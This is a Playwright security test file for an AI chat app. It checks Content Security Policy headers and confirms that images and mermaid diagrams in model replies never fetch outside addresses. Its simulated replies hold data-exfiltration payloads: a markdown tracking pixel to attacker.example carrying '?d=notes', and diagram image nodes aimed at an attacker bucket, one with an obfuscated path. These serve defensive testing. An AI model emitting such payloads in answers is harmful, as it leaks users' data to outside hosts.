import type { APIResponse, Page } from "@playwright/test";
import {
	chatName,
	createChat,
	openChat,
	sendTurn,
	setUpChatModel,
} from "../../fixtures/chat/chat";
import { expect, test } from "../../fixtures/inference/fixture";
import { message } from "../../fixtures/messages";
import { awaitHydration, enterApp, open } from "../../fixtures/navigation";

/** Collects what the browser refused under the Content Security Policy. */
const violationsOf = (page: Page) => {
	const violations: string[] = [];
	page.on("console", (entry) => {
		if (entry.text().includes("Content Security Policy")) {
			violations.push(`${page.url()}: ${entry.text()}`);
		}
	});
	return violations;
};

const policyOf = (response: APIResponse) =>
	response.headers()["content-security-policy"];

const enforcedPolicy = async (page: Page, path: string) => {
	const response = await page.goto(path);
	return response?.headers()["content-security-policy"];
};

test("security: every main area loads under the Content Security Policy without a violation", async ({
	api,
	inference,
	org,
	page,
	pageAs,
	pageAsWellKnownAdmin,
}) => {
	test.slow();
	const signedOut = violationsOf(page);
	expect(await enforcedPolicy(page, "/login")).toContain("'nonce-");
	await awaitHydration(page);
	expect(signedOut).toEqual([]);

	const model = await setUpChatModel(api, inference);
	const member = api.as("member");
	const chatId = await createChat(member, model, chatName("Policy"));
	await sendTurn({
		client: member,
		inference,
		chatId,
		turn: {
			question: "Show formula, code and a diagram.",
			reply:
				"Euler: $$e^{i\\pi} + 1 = 0$$\n\n```ts\nconst sky = 'blue';\n```\n\n```mermaid\ngraph TD; A-->B\n```",
		},
	});
	const memberPage = await pageAs("member");
	const signedIn = violationsOf(memberPage);
	await enterApp(memberPage, org.slug);
	await openChat(memberPage, chatId);
	await expect(memberPage.locator(".katex").first()).toBeVisible();
	for (const path of [
		"/app",
		"/app/library",
		"/app/catalogue",
		"/app/assistant",
		"/app/account",
	]) {
		await open(memberPage, path);
	}
	expect(signedIn).toEqual([]);

	const admin = await pageAs("admin");
	const administration = violationsOf(admin);
	await enterApp(admin, org.slug);
	for (const path of [
		"/app/organization",
		"/app/members",
		"/app/providers",
		"/app/analytics",
	]) {
		await open(admin, path);
	}
	expect(administration).toEqual([]);

	const instanceAdmin = await pageAsWellKnownAdmin();
	const instance = violationsOf(instanceAdmin);
	await open(instanceAdmin, "/instance");
	await open(instanceAdmin, "/instance/users");
	expect(instance).toEqual([]);
});

test("security: an image from another site in an answer shows as a link and is never requested", async ({
	api,
	inference,
	org,
	pageAs,
}) => {
	const model = await setUpChatModel(api, inference);
	const member = api.as("member");
	const chatId = await createChat(member, model, chatName("Image"));
	await sendTurn({
		client: member,
		inference,
		chatId,
		turn: {
			question: "Summarise my notes.",
			reply:
				"Done. ![Tracking pixel](https://attacker.example/p.png?d=notes) Anything else?",
		},
	});

	const page = await pageAs("member");
	const requested: string[] = [];
	page.on("request", (request) => {
		if (new URL(request.url()).hostname === "attacker.example") {
			requested.push(request.url());
		}
	});
	await enterApp(page, org.slug);
	await openChat(page, chatId);

	await expect(
		page.locator('[data-streamdown="link"]', {
			hasText: "Tracking pixel",
		}),
	).toBeVisible();
	await expect(page.locator('img[src*="attacker.example"]')).toHaveCount(0);
	expect(requested).toEqual([]);
});

test("security: a diagram that loads an image from storage or another site is not rendered, however the address is spelled", async ({
	api,
	inference,
	org,
	pageAs,
}) => {
	const storage = process.env.S3_PUBLIC_ENDPOINT;
	if (!storage) throw new Error("S3_PUBLIC_ENDPOINT is not set");
	const leak = new URL("/attacker-bucket/p.png?d=notes", storage);
	const model = await setUpChatModel(api, inference);
	const member = api.as("member");
	const chatId = await createChat(member, model, chatName("Diagram"));
	await sendTurn({
		client: member,
		inference,
		chatId,
		turn: {
			question: "Draw my notes.",
			reply: [
				"```mermaid",
				"graph TD",
				`  A@{ img: "${leak.href}", label: "Notes" }`,
				"```",
				"",
				"```mermaid",
				"graph TD",
				'  B@{ img: "https://attacker.example/p.png", label: "Notes" }',
				"```",
				"",
				"```mermaid",
				"graph TD",
				`  C@{ img: '/\\${leak.host}${leak.pathname}${leak.search}', label: "Notes" }`,
				"```",
				"",
				"```mermaid",
				"graph TD",
				"  D[Styled] --> E[Diagram]",
				"  classDef default fill:#f9f,stroke:#333;",
				"```",
			].join("\n"),
		},
	});

	const page = await pageAs("member");
	const requested: string[] = [];
	page.on("request", (request) => {
		const url = new URL(request.url());
		if (
			url.pathname.startsWith("/attacker-bucket/") ||
			url.hostname === "attacker.example"
		) {
			requested.push(request.url());
		}
	});
	await enterApp(page, org.slug);
	await openChat(page, chatId);

	// Streamdown renders a diagram once its block scrolls into view.
	const diagrams = page.locator('[data-streamdown="mermaid-block"]');
	await expect(diagrams).toHaveCount(4);
	for (const [index, shown] of [
		[
			0,
			message("ai_elements_diagram_blocked"),
		],
		[
			1,
			message("ai_elements_diagram_blocked"),
		],
		[
			2,
			message("ai_elements_diagram_blocked"),
		],
		[
			3,
			"Diagram",
		],
	] as const) {
		const diagram = diagrams.nth(index);
		await diagram.scrollIntoViewIfNeeded();
		await expect(diagram.getByText(shown)).toBeVisible();
	}
	expect(requested).toEqual([]);
});

test("security: static files, revalidations and errors carry the policy too", async ({
	page,
	request,
}) => {
	await page.goto("/login");
	const script = await page
		.locator('script[src^="/assets/"]')
		.first()
		.getAttribute("src");
	if (!script) throw new Error("The page loads no script from /assets/");

	const asset = await request.get(script);
	expect(asset.status()).toBe(200);
	expect(policyOf(asset)).toContain("default-src 'self'");
	const etag = asset.headers().etag;
	if (!etag) throw new Error("The asset has no ETag");

	const revalidated = await request.get(script, {
		headers: {
			"If-None-Match": etag,
		},
	});
	expect(revalidated.status()).toBe(304);
	expect(policyOf(revalidated)).toContain("default-src 'self'");

	for (const path of [
		"/assets/missing.js",
		"/api/missing",
		"/missing-page",
	]) {
		const missing = await request.get(path);
		expect(missing.status()).toBe(404);
		expect(policyOf(missing)).toContain("default-src 'self'");
	}
});
